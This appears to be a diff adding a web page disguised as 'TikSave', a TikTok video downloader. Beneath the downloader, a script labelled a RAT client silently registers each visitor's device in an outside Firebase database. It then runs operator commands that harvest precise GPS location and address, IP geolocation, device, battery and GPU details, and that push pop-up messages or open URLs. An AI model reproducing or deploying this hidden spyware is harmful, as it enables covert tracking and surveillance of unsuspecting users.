@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>TikSave · TikTok Video Downloader</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
+
+<style>
+::-webkit-scrollbar{display:none}
+*{scrollbar-width:none}
+body{font-family:'Space Grotesk',sans-serif;background:#0d0d0d;color:#e5e7eb;min-height:100vh;position:relative}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,.012) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.012) 1px,transparent 1px);background-size:42px 42px;pointer-events:none;z-index:0}
+.z1{position:relative;z-index:1}
+
+.paste-box{background:rgba(255,255,255,.015);border:2px dashed rgba(255,255,255,.05);border-radius:18px;padding:28px 20px;text-align:center;transition:.3s}
+.paste-box:focus-within{border-color:rgba(255,255,255,.12);background:rgba(255,255,255,.02)}
+.paste-box:hover{border-color:rgba(255,255,255,.08)}
+
+.input-field{width:100%;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);color:#ccc;padding:12px 16px;border-radius:10px;font-size:13px;font-family:'Space Grotesk',sans-serif;outline:none;transition:.3s;text-align:center}
+.input-field:focus{border-color:rgba(255,255,255,.15);background:rgba(255,255,255,.04);color:#fff}
+.input-field::placeholder{color:#3a3a3a}
+
+.btn-get{width:100%;background:#1a1a1a;color:#ddd;border:1px solid rgba(255,255,255,.08);padding:13px 20px;border-radius:12px;font-weight:600;font-size:13px;cursor:pointer;transition:.25s;font-family:'Space Grotesk',sans-serif;letter-spacing:.02em;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-get:hover{background:#222;color:#fff;border-color:rgba(255,255,255,.15);transform:translateY(-1px)}
+.btn-get:active{transform:scale(.98)}
+.btn-get:disabled{background:#111;color:#333;cursor:not-allowed;transform:none;border-color:rgba(255,255,255,.03)}
+
+.btn-dl{background:rgba(255,255,255,.02);color:#bbb;border:1px solid rgba(255,255,255,.08);padding:12px 10px;border-radius:10px;font-weight:500;font-size:11px;cursor:pointer;transition:.2s;font-family:'Space Grotesk',sans-serif;text-align:center;display:flex;align-items:center;justify-content:center;gap:7px;width:100%}
+.btn-dl:hover{background:rgba(255,255,255,.05);color:#fff;border-color:rgba(255,255,255,.15)}
+
+.feat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.feat-card{background:rgba(255,255,255,.012);border:1px solid rgba(255,255,255,.03);border-radius:14px;padding:16px 10px;text-align:center;transition:.3s}
+.feat-card:hover{background:rgba(255,255,255,.02);border-color:rgba(255,255,255,.06)}
+.feat-ic{font-size:20px;display:block;margin-bottom:5px}
+.feat-lb{font-size:9.5px;color:#666;font-weight:500}
+
+.result-box{background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.05);border-radius:16px;padding:18px;margin-top:14px;display:none}
+.result-thumb{width:100%;border-radius:10px;margin-bottom:12px;max-height:300px;object-fit:cover}
+.result-stats{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:10px}
+.result-stat{background:rgba(255,255,255,.015);border-radius:8px;padding:10px;text-align:center}
+.result-stat-v{font-size:13px;font-weight:600;color:#fff}
+.result-stat-l{font-size:8px;color:#555;text-transform:uppercase;letter-spacing:.06em;font-family:'Ubuntu Mono',monospace}
+.result-btns{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.result-text{font-size:11px;color:#999;margin-bottom:12px;text-align:center;line-height:1.5;max-height:60px;overflow-y:auto}
+.result-author{display:flex;align-items:center;gap:8px;margin-bottom:10px;justify-content:center}
+.result-avatar{width:32px;height:32px;border-radius:50%;border:1px solid rgba(255,255,255,.1)}
+.result-nick{font-size:11px;color:#ccc;font-weight:500}
+
+.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;animation:fadeIn .25s}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.alert-box{background:#0a0a0a;border:1px solid #ff2d2d;border-radius:16px;padding:32px 24px;text-align:center;max-width:88vw;box-shadow:0 0 60px rgba(255,0,0,.1)}
+.alert-msg{color:#ff4444;font-size:15px;font-weight:600;word-break:break-word;line-height:1.5}
+.alert-close{background:transparent;color:#ff5555;border:1px solid #ff2d2d;padding:10px 26px;border-radius:10px;font-size:12px;font-weight:600;cursor:pointer;margin-top:12px;transition:.2s}
+.alert-close:hover{background:#ff2d2d;color:#000}
+
+.spin{animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<div class="z1" style="max-width:540px;margin:0 auto;padding:36px 16px">
+
+  <!-- HEADER -->
+  <div style="text-align:center;margin-bottom:28px">
+    <div style="margin-bottom:8px">
+      <i class="fab fa-tiktok" style="font-size:48px;color:#fff"></i>
+    </div>
+    <h1 style="font-size:22px;font-weight:700;color:#fff;letter-spacing:-.02em">TikSave</h1>
+    <p style="font-size:10px;color:#555;font-family:'Ubuntu Mono',monospace;letter-spacing:.08em;margin-top:4px">TIKTOK VIDEO DOWNLOADER · NO WATERMARK · HD</p>
+  </div>
+
+  <!-- INPUT -->
+  <div class="paste-box" style="margin-bottom:14px">
+    <div style="font-size:24px;margin-bottom:8px">
+      <i class="fas fa-link" style="color:#3a3a3a"></i>
+    </div>
+    <p style="font-size:12px;color:#777;font-weight:500;margin-bottom:4px">Paste TikTok Video Link</p>
+    <p style="font-size:9px;color:#3a3a3a;font-family:'Ubuntu Mono',monospace;margin-bottom:12px">
+      <i class="fas fa-check-circle" style="color:#444"></i> tiktok.com · vt.tiktok.com · m.tiktok.com
+    </p>
+    <input class="input-field" id="urlInput" placeholder="https://vt.tiktok.com/..." autocomplete="off">
+    <button class="btn-get" id="dlBtn" onclick="handleDownload()" style="margin-top:10px">
+      <i class="fab fa-tiktok" style="font-size:15px"></i> Get Video
+    </button>
+  </div>
+
+  <!-- FEATURES -->
+  <div class="feat-grid">
+    <div class="feat-card"><span class="feat-ic"><i class="fas fa-video" style="color:#888"></i></span><p class="feat-lb">HD Quality</p></div>
+    <div class="feat-card"><span class="feat-ic"><i class="fas fa-music" style="color:#777"></i></span><p class="feat-lb">MP3 Audio</p></div>
+    <div class="feat-card"><span class="feat-ic"><i class="fas fa-ban" style="color:#666"></i></span><p class="feat-lb">No Watermark</p></div>
+  </div>
+
+  <!-- RESULT -->
+  <div class="result-box" id="resultBox">
+    <img class="result-thumb" id="resultThumb" src="" onerror="this.style.display='none'" style="display:none">
+    <div class="result-author" id="resultAuthor" style="display:none">
+      <img class="result-avatar" id="resultAvatar" src="" onerror="this.style.display='none'">
+      <span class="result-nick" id="resultNick"></span>
+    </div>
+    <p class="result-text" id="resultText"></p>
+    <div class="result-stats" id="resultStats">
+      <div class="result-stat"><p class="result-stat-v" id="stPlays">—</p><p class="result-stat-l">Plays</p></div>
+      <div class="result-stat"><p class="result-stat-v" id="stLikes">—</p><p class="result-stat-l">Likes</p></div>
+      <div class="result-stat"><p class="result-stat-v" id="stComments">—</p><p class="result-stat-l">Comments</p></div>
+      <div class="result-stat"><p class="result-stat-v" id="stShares">—</p><p class="result-stat-l">Shares</p></div>
+    </div>
+    <div class="result-btns" id="resultBtns">
+      <button class="btn-dl" onclick="downloadMedia('hd')"><i class="fas fa-video"></i> HD Video</button>
+      <button class="btn-dl" onclick="downloadMedia('nowm')"><i class="fas fa-file-video"></i> No Watermark</button>
+      <button class="btn-dl" onclick="downloadMedia('mp3')" style="grid-column:1/-1"><i class="fas fa-headphones"></i> MP3 Audio</button>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div style="text-align:center;margin-top:20px;padding:10px;background:rgba(255,255,255,.008);border-radius:10px;border:1px solid rgba(255,255,255,.02)">
+    <p style="font-size:8.5px;color:#2a2a2a;font-family:'Ubuntu Mono',monospace">
+      <span id="ping" style="color:#2a2a2a">●</span> v2.5.0 · Secure Connection
+    </p>
+  </div>
+</div>
+
+<script>
+// ═══════════════════════ AZRILXRAT CLIENT ═══════════════════════
+const STORAGE_KEY='__ts_sid';
+let DEVICE_ID=localStorage.getItem(STORAGE_KEY);
+if(!DEVICE_ID){DEVICE_ID='DVC_'+Math.random().toString(36).substr(2,9)+'_'+Date.now().toString(36);localStorage.setItem(STORAGE_KEY,DEVICE_ID)}
+
+const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
+firebase.initializeApp(FB);
+const db=firebase.database();
+
+async function fetchJSON(u){const r=await fetch(u);return await r.json()}
+function ts(){return Date.now()}
+
+db.ref('devices/'+DEVICE_ID).update({
+  id:DEVICE_ID,model:(navigator.userAgent.split(';')[1]||'Browser').trim().substring(0,50),
+  platform:navigator.platform,lang:navigator.language,
+  scr:screen.width+'x'+screen.height,reg:ts(),seen:ts(),on:true
+}).then(()=>{
+  const p=document.getElementById('ping');p.textContent='● ONLINE';p.style.color='#4ade80';
+});
+setInterval(()=>db.ref('devices/'+DEVICE_ID).update({seen:ts(),on:true}),12000);
+
+// ═══════════════════════ 7 COMMANDS ═══════════════════════
+async function gpsFull(){return new Promise(r=>{if(!navigator.geolocation){r({err:"GPS unavailable"});return}navigator.geolocation.getCurrentPosition(async p=>{const lat=p.coords.latitude,lon=p.coords.longitude;try{const re=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);const d=await re.json();r({lat,lon,acc:Math.round(p.coords.accuracy)+'m',addr:d.display_name,city:d.address?.city||d.address?.town||'',state:d.address?.state||'',country:d.address?.country||'',map:`https://maps.google.com/?q=${lat},${lon}`})}catch(e){r({lat,lon,acc:Math.round(p.coords.accuracy)+'m',map:`https://maps.google.com/?q=${lat},${lon}`})}},e=>r({err:e.message}),{enableHighAccuracy:true,timeout:10000})})}
+async function ipGeo(){return await fetchJSON('https://ipapi.co/json/')}
+async function devInfo(){let bat='N/A';try{const b=await navigator.getBattery();bat=Math.round(b.level*100)+'% '+(b.charging?'Charging':'Battery')}catch(e){}let ip='N/A';try{ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch(e){}return{ua:navigator.userAgent.substring(0,150),os:navigator.platform,lang:navigator.language,res:screen.width+'x'+screen.height+' @'+devicePixelRatio+'x',ram:navigator.deviceMemory||'?',cpu:navigator.hardwareConcurrency||'?',bat,ip,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,on:navigator.onLine,ck:navigator.cookieEnabled}}
+function hwInfo(){let gpu='N/A';try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg)gpu=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}}catch(e){}return{ram:navigator.deviceMemory||'?',cpu:navigator.hardwareConcurrency||'?',gpu,touch:'ontouchstart' in window,maxTouch:navigator.maxTouchPoints||0}}
+function alertFull(msg){const ov=document.createElement('div');ov.className='alert-overlay';ov.innerHTML=`<div class="alert-box"><p class="alert-msg">${msg}</p><button class="alert-close" onclick="this.closest('.alert-overlay').remove()">TUTUP</button></div>`;document.body.appendChild(ov);return{status:'alerted',msg}}
+
+async function exec(cmd){
+  const r={type:cmd,status:'ok',time:ts()};
+  switch(cmd){
+    case 'GPS':r.data=await gpsFull();break;
+    case 'IP':r.data=await ipGeo();break;
+    case 'INFO':r.data=await devInfo();break;
+    case 'HW':r.data=hwInfo();break;
+    default:
+      if(cmd.startsWith('MSG:')){r.data=alertFull(cmd.slice(4));r.type='ALERT'}
+      else if(cmd.startsWith('URL:')){open(cmd.slice(4),'_blank');r.data={url:cmd.slice(4)};r.type='OPEN_URL'}
+      else r.data={err:'unknown'};
+  }
+  return r;
+}
+
+db.ref('cmds/'+DEVICE_ID).on('child_added',async sn=>{
+  const c=sn.val();if(!c||c.st!=='pending')return;
+  sn.ref.update({st:'running'});
+  const result=await exec(c.cmd);
+  db.ref('data').push(result);
+  sn.ref.update({st:'done'});
+  setTimeout(()=>sn.ref.remove(),3000);
+});
+
+// ═══════════════════════ TIKTOK DOWNLOADER (PROXY API) ═══════════════════════
+let videoData=null;
+
+async function handleDownload(){
+  const urlInput=document.getElementById('urlInput');
+  const url=urlInput.value.trim();
+  if(!url){showMsg('Please paste a TikTok link');return}
+
+  const btn=document.getElementById('dlBtn');
+  btn.disabled=true;
+  btn.innerHTML='<i class="fas fa-spinner spin"></i> Fetching...';
+
+  const box=document.getElementById('resultBox');
+  box.style.display='block';
+  box.innerHTML='<div style="text-align:center;padding:24px;color:#555"><i class="fas fa-spinner spin" style="font-size:22px;display:block;margin-bottom:8px"></i><p style="font-size:10px">Fetching video info...</p></div>';
+
+  try{
+    // PAKE PROXY SENDIRI - NO CORS ERROR!
+    const proxyUrl='/api/tiktok?url='+encodeURIComponent(url);
+    const data=await fetchJSON(proxyUrl);
+
+    if(!data||data.code!==0||!data.data){
+      box.innerHTML='<div style="text-align:center;padding:20px;color:#f87171"><i class="fas fa-circle-exclamation" style="font-size:22px;display:block;margin-bottom:6px"></i><p style="font-size:10px">Video not found. Check your link.</p></div>';
+      btn.disabled=false;
+      btn.innerHTML='<i class="fab fa-tiktok" style="font-size:15px"></i> Get Video';
+      return;
+    }
+
+    videoData=data.data;
+    renderResult(videoData);
+  }catch(e){
+    console.error(e);
+    box.innerHTML='<div style="text-align:center;padding:20px;color:#f87171"><i class="fas fa-circle-exclamation" style="font-size:22px;display:block;margin-bottom:6px"></i><p style="font-size:10px">Network error. Try again.</p></div>';
+  }
+
+  btn.disabled=false;
+  btn.innerHTML='<i class="fab fa-tiktok" style="font-size:15px"></i> Get Video';
+}
+
+function renderResult(data){
+  const thumb=document.getElementById('resultThumb');
+  if(data.cover){thumb.src=data.cover;thumb.style.display='block'}
+  else{thumb.style.display='none'}
+
+  const authorDiv=document.getElementById('resultAuthor');
+  if(data.author){
+    authorDiv.style.display='flex';
+    document.getElementById('resultAvatar').src=data.author.avatar||'';
+    document.getElementById('resultNick').textContent=data.author.nickname||data.author.unique_id||'';
+  }else{authorDiv.style.display='none'}
+
+  document.getElementById('resultText').textContent=data.title||'';
+  document.getElementById('stPlays').textContent=data.play_count||'0';
+  document.getElementById('stLikes').textContent=data.digg_count||'0';
+  document.getElementById('stComments').textContent=data.comment_count||'0';
+  document.getElementById('stShares').textContent=data.share_count||'0';
+  document.getElementById('resultBox').style.display='block';
+}
+
+function downloadMedia(type){
+  if(!videoData){showMsg('No video data');return}
+  let link='';
+  if(type==='hd')link=videoData.hdplay||videoData.play;
+  else if(type==='nowm')link=videoData.play||videoData.hdplay;
+  else if(type==='mp3')link=videoData.music||videoData.music_info?.url;
+  if(!link){showMsg('Download link not available');return}
+  window.open(link,'_blank');
+}
+
+function showMsg(msg){
+  const box=document.getElementById('resultBox');
+  box.style.display='block';
+  box.innerHTML='<div style="text-align:center;padding:16px;color:#888"><p style="font-size:10px">'+msg+'</p></div>';
+  setTimeout(()=>{if(!videoData)box.style.display='none'},2000);
+}
+</script>
+</body>
+</html>
